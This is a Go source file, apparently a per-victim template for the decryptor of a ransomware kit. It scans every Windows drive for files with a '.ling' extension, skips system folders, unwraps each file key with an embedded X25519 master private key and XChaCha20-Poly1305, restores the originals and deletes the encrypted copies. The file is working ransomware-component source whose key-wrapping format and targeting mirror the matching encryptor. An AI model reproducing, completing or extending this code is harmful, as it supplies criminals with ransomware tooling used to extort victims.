package main

import (
	"crypto/ecdh"
	"encoding/binary"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/crypto/chacha20poly1305"
)

const encryptedExt = ".ling"
const myID = "{{.ID}}" // Bisa digunakan untuk validasi, opsional

var excludedDirs = map[string]struct{}{
	"$recycle.bin":              {},
	"system volume information": {},
	"windows":                   {},
	"program files":             {},
	"program files (x86)":       {},
	"programdata":               {},
	"appdata":                   {},
}

func isExcludedDir(name string) bool {
	if len(name) > 0 && name[0] == '$' {
		return true
	}
	_, ok := excludedDirs[name]
	return ok
}

type Stats struct {
	files     int64
	folders   int64
	skipped   int64
	errors    int64
	totalSize int64
}

func detectDrives() []string {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	getLogicalDrives := kernel32.NewProc("GetLogicalDrives")
	getDriveType := kernel32.NewProc("GetDriveTypeW")

	ret, _, _ := getLogicalDrives.Call()
	bitmask := uint32(ret)

	var drives []string
	for i := 0; i < 26; i++ {
		if bitmask&(1<<uint(i)) == 0 {
			continue
		}
		letter := rune('A' + i)
		drive := fmt.Sprintf("%c:\\", letter)

		drivePtr, _ := syscall.UTF16PtrFromString(drive)
		driveType, _, _ := getDriveType.Call(uintptr(unsafe.Pointer(drivePtr)))

		switch driveType {
		case 2, 3, 4, 6:
			drives = append(drives, drive)
		}
	}
	return drives
}

func isSymlink(path string) bool {
	fi, err := os.Lstat(path)
	if err != nil {
		return false
	}
	return fi.Mode()&os.ModeSymlink != 0
}

func scanProducer(drives []string, dirChan chan<- string, wg *sync.WaitGroup, dirPending *sync.WaitGroup) {
	defer wg.Done()
	for _, drive := range drives {
		dirPending.Add(1)
		dirChan <- drive
	}
}

func dirWorker(stats *Stats, fileChan chan<- string, dirChan chan string, sem chan struct{}, wg *sync.WaitGroup, dirPending *sync.WaitGroup, filePending *sync.WaitGroup) {
	defer wg.Done()
	for path := range dirChan {
		sem <- struct{}{}
		func(p string) {
			defer dirPending.Done()
			defer func() { <-sem }()

			if isSymlink(p) {
				atomic.AddInt64(&stats.skipped, 1)
				return
			}

			entries, err := os.ReadDir(p)
			if err != nil {
				atomic.AddInt64(&stats.errors, 1)
				return
			}

			for _, entry := range entries {
				name := entry.Name()
				fullPath := filepath.Join(p, name)

				if entry.IsDir() {
					if isExcludedDir(name) {
						atomic.AddInt64(&stats.skipped, 1)
						continue
					}
					atomic.AddInt64(&stats.folders, 1)
					dirPending.Add(1)
					go func(sub string) {
						dirChan <- sub
					}(fullPath)
				} else {
					if filepath.Ext(name) != encryptedExt {
						atomic.AddInt64(&stats.skipped, 1)
						continue
					}
					filePending.Add(1)
					go func(fp string) {
						defer filePending.Done()
						fileChan <- fp
					}(fullPath)
				}
			}
		}(path)
	}
}

func formatSize(b int64) string {
	const KB, MB, GB, TB = 1024, 1024 * 1024, 1024 * 1024 * 1024, 1024 * 1024 * 1024 * 1024
	switch {
	case b >= TB:
		return fmt.Sprintf("%.2f TB", float64(b)/float64(TB))
	case b >= GB:
		return fmt.Sprintf("%.2f GB", float64(b)/float64(GB))
	case b >= MB:
		return fmt.Sprintf("%.2f MB", float64(b)/float64(MB))
	case b >= KB:
		return fmt.Sprintf("%.2f KB", float64(b)/float64(KB))
	default:
		return fmt.Sprintf("%d Bytes", b)
	}
}

func formatNumber(n int64) string {
	s := fmt.Sprintf("%d", n)
	if len(s) <= 3 {
		return s
	}
	var result []byte
	for i, c := range s {
		if i > 0 && (len(s)-i)%3 == 0 {
			result = append(result, '.')
		}
		result = append(result, byte(c))
	}
	return string(result)
}

func zeroMemory(data []byte) {
	for i := range data {
		data[i] = 0
	}
	runtime.KeepAlive(data)
}

var masterPrivKeyBytes = []byte{{.PrivateKeyBytes}}

const chunkSize = 64 * 1024
const headerSize = 32 + 24 + 48 + 16

func decryptFileStream(encryptedPath string, stats *Stats, masterPrivKey *ecdh.PrivateKey) {
	success := false
	origPath := strings.TrimSuffix(encryptedPath, encryptedExt)

	fIn, err := os.Open(encryptedPath)
	if err != nil {
		atomic.AddInt64(&stats.errors, 1)
		return
	}
	defer fIn.Close()

	header := make([]byte, headerSize)
	_, err = io.ReadFull(fIn, header)
	if err != nil {
		atomic.AddInt64(&stats.skipped, 1)
		return
	}

	ephPubKeyBytes := header[:32]
	nonceGembok := header[32:56]
	wrappedKey := header[56:104]
	baseNonce := header[104:120]

	ephPubKey, err := ecdh.X25519().NewPublicKey(ephPubKeyBytes)
	if err != nil {
		atomic.AddInt64(&stats.errors, 1)
		return
	}

	sharedSecret, err := masterPrivKey.ECDH(ephPubKey)
	if err != nil {
		atomic.AddInt64(&stats.errors, 1)
		return
	}
	defer zeroMemory(sharedSecret)

	aeadGembok, err := chacha20poly1305.NewX(sharedSecret)
	if err != nil {
		atomic.AddInt64(&stats.errors, 1)
		return
	}

	fileKey, err := aeadGembok.Open(nil, nonceGembok, wrappedKey, nil)
	if err != nil {
		atomic.AddInt64(&stats.errors, 1)
		return
	}
	defer zeroMemory(fileKey)

	aeadFile, err := chacha20poly1305.NewX(fileKey)
	if err != nil {
		atomic.AddInt64(&stats.errors, 1)
		return
	}

	fOut, err := os.Create(origPath)
	if err != nil {
		atomic.AddInt64(&stats.errors, 1)
		return
	}
	defer func() {
		fOut.Close()
		if !success {
			os.Remove(origPath)
		}
	}()

	cipherBuf := make([]byte, chunkSize+16)
	plainBuf := make([]byte, 0, chunkSize)
	var counter uint64 = 0

	for {
		n, err := io.ReadFull(fIn, cipherBuf)
		if err != nil && err != io.EOF && err != io.ErrUnexpectedEOF {
			atomic.AddInt64(&stats.errors, 1)
			return
		}
		if n == 0 {
			break
		}

		nonce := make([]byte, 24)
		copy(nonce, baseNonce)
		binary.BigEndian.PutUint64(nonce[16:], counter)
		counter++

		plaintext, err := aeadFile.Open(plainBuf[:0], nonce, cipherBuf[:n], nil)
		if err != nil {
			atomic.AddInt64(&stats.errors, 1)
			return
		}

		if _, err := fOut.Write(plaintext); err != nil {
			atomic.AddInt64(&stats.errors, 1)
			return
		}
		plainBuf = plaintext[:0]

		if err == io.EOF || err == io.ErrUnexpectedEOF {
			break
		}
	}

	fIn.Close()
	fOut.Close()

	if err := os.Remove(encryptedPath); err != nil {
		atomic.AddInt64(&stats.errors, 1)
	}

	if fi, err := os.Stat(origPath); err == nil {
		atomic.AddInt64(&stats.totalSize, fi.Size())
	}
	atomic.AddInt64(&stats.files, 1)

	success = true
}

func main() {
	numCPU := runtime.NumCPU()
	runtime.GOMAXPROCS(numCPU)
	workerCount := numCPU * 2
	fileChan := make(chan string, 1000)
	dirChan := make(chan string, 1000)

	fmt.Println(strings.Repeat("═", 50))
	fmt.Println("   DECRYPTOR ENGINE — Professional Edition")
	fmt.Println(strings.Repeat("═", 50))
	fmt.Printf("CPU Cores : %d\n", numCPU)
	fmt.Printf("Workers   : %d\n", workerCount)
	fmt.Printf("Mulai     : %s\n", time.Now().Format("2006-01-02 15:04:05"))
	fmt.Println(strings.Repeat("─", 50))

	start := time.Now()
	stats := &Stats{}

	masterPrivKey, err := ecdh.X25519().NewPrivateKey(masterPrivKeyBytes)
	if err != nil {
		panic("Invalid master private key")
	}

	var consumerWg sync.WaitGroup
	for i := 0; i < workerCount; i++ {
		consumerWg.Add(1)
		go func() {
			defer consumerWg.Done()
			for fpath := range fileChan {
				decryptFileStream(fpath, stats, masterPrivKey)
			}
		}()
	}

	var producerWg sync.WaitGroup
	var dirPending sync.WaitGroup
	var filePending sync.WaitGroup

	drives := detectDrives()
	producerWg.Add(1)
	go scanProducer(drives, dirChan, &producerWg, &dirPending)

	go func() {
		producerWg.Wait()
		dirPending.Wait()
		close(dirChan)
	}()

	var dirWg sync.WaitGroup
	sem := make(chan struct{}, numCPU*2)
	for i := 0; i < workerCount; i++ {
		dirWg.Add(1)
		go dirWorker(stats, fileChan, dirChan, sem, &dirWg, &dirPending, &filePending)
	}

	dirWg.Wait()
	filePending.Wait()
	close(fileChan)

	consumerWg.Wait()

	elapsed := time.Since(start)

	fmt.Println()
	fmt.Println(strings.Repeat("═", 50))
	fmt.Println("               HASIL DEKRIPSI")
	fmt.Println(strings.Repeat("═", 50))
	fmt.Printf("  File didekripsi : %s\n", formatNumber(atomic.LoadInt64(&stats.files)))
	fmt.Printf("  Total Folder    : %s\n", formatNumber(atomic.LoadInt64(&stats.folders)))
	fmt.Printf("  Total Ukuran    : %s\n", formatSize(atomic.LoadInt64(&stats.totalSize)))
	fmt.Printf("  Dilewati        : %s path\n", formatNumber(atomic.LoadInt64(&stats.skipped)))
	fmt.Printf("  Error           : %s\n", formatNumber(atomic.LoadInt64(&stats.errors)))
	fmt.Printf("  Durasi          : %s\n", elapsed.Round(time.Millisecond))
	fmt.Println(strings.Repeat("═", 50))
}